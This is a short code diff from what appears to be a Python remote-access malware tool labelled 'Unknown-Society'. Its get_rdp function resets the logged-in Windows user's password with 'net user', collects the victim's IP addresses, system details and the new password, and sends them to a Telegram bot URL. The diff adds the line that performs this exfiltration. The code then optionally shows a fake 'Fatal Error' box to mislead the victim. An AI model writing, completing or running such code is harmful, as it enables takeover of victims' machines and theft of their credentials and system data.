@@ -22,6 +22,7 @@ def get_rdp():
     subprocess.check_output(f"net user {os.getlogin()} {passs}",shell=True)
     build = f"======== [Unknown-Society] ========\nUsername : {os.getlogin()}\nPublic Ip : {pub_ip}\nPrivate Ip : {priv_ip}\nPassword : {passs}\nRam : {ram}\nSystem : {system}\nNode : {node}\nrelease : {release}\nversion : {version}\nmachine : {machine}\nprocessor : {processor}\n======== [Unknown-Society] ========"
     url=(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={build}")
+    send = requests.get(url).text
     if fake_error == "on":
         ctypes.windll.user32.MessageBoxW(None, f'Error code: 0x80070002\n{error_msg}', 'Fatal Error', 0)
     else:
